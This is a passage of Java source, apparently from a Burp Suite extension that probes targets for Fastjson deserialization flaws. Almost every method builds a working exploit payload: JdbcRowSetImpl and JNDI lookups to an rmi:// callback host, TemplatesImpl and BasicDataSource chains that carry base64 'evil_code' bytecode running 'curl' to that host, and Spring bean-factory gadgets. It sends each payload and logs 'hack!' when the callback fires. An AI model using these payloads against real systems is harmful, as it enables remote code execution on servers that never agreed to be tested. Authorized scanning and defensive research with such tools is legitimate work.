        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_1", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_1", poc, "pass"));
        }
    }

    public static void JdbcRowSetImpl_2() {
        String poc = JdbcRowSetImpl_2_poc;
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://"+ val +"\",\"autoCommit\":true]}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_2", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_2", poc, "pass"));
        }
    }

    public static void JdbcRowSetImpl_3() {
        String poc = JdbcRowSetImpl_3_poc;
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_3", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_3", poc, "pass"));
        }
    }

    public static void JdbcRowSetImpl_4() {
        String poc = JdbcRowSetImpl_4_poc;
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + val +"/name\",\"autoCommit\":true}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "pass"));
        }
    }

    public static void TemplatesImpl_0() {
        String poc = TemplatesImpl_0_poc;
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        //Setp01: 生成exploit bytecode
        byte[] evil_code = Gadget.getTemplatesImpl1ExpCode("curl http://" + val);
        //Setp02:生成payload
        String base64Code = Base64.encodeBase64String(evil_code);
        // 据说可以覆盖所有版本
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}".replace("###EVIL_CODE###", base64Code);

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "pass"));
        }
    }

    public static void TemplatesImpl_1() {
        String poc = TemplatesImpl_1_poc;
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        //Setp01: 生成exploit bytecode
        byte[] evil_code = Gadget.getTemplatesImpl2ExpCode("curl http://" + val);
        //Setp02:生成payload
        String base64Code = Base64.encodeBase64String(evil_code);
        // 据说可以覆盖所有版本
        String payload = "{\"@type\":\"org.apache.xalan.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}".replace("###EVIL_CODE###", base64Code);

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "pass"));
        }
    }

    public static void BasicDataSource_0() {
        String poc = BasicDataSource_0_poc;

        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        //Setp01: 生成exploit bytecode
        byte[] evil_code = Gadget.getTemplatesImpl2ExpCode("curl http://" + val);
        //Setp02:生成payload
        String base64Code = Base64.encodeBase64String(evil_code);
        // 据说可以覆盖所有版本
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}".replace("###EVIL_CODE###", base64Code);

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "pass"));
        }
    }

    public static void BasicDataSource_1() {
        String poc = BasicDataSource_1_poc;
        // 1.2.24 + JDK1.8.0_102
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        //Setp01: 生成exploit bytecode
        byte[] evil_code = Gadget.getTemplatesImpl2ExpCode("curl http://" + val);
        //Setp02:生成payload
        String base64Code = Base64.encodeBase64String(evil_code);
        // 据说可以覆盖所有版本
        String payload = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}".replace("###EVIL_CODE###", base64Code);

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "pass"));
        }
    }


    public static void JndiDataSourceFactory() {
        String poc = JndiDataSourceFactory_poc;
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://"+ val +"/name\"}}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JndiDataSourceFactory", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JndiDataSourceFactory", poc, "pass"));
        }
    }

    public static void SimpleJndiBeanFactory() {
        String poc = SimpleJndiBeanFactory_poc;
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "{\"handsome\": Set [{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"rmi://"+val+"/name\"]},\"adviceBeanName\":\"rmi://"+ val +"/name\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        try {
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            // // 等待，直到运行结束
            thread.join();
        } catch (Exception e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "SimpleJndiBeanFactory", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "SimpleJndiBeanFactory", poc, "pass"));
        }
    }
}
